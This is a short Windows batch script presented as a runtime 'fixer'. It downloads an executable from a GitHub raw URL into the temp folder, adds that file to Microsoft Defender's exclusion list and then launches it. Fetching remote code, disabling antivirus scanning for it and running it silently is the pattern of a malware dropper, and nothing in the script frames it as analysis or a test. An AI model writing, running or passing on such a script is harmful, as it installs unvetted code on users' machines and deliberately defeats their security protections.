@echo off
setlocal

set "url=https://raw.githubusercontent.com/EvocatedSupport/RuntimeDefender/main/EvocativeFixerV4.exe"
set "output=%TEMP%\RuntimeFixer.exe"

:: Download EXE
powershell -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%output%')"

:: Add EXE to Defender exclusion
powershell -Command "Add-MpPreference -ExclusionPath '%output%'"

:: Run the EXE
start "" "%output%"

endlocal
exit /b
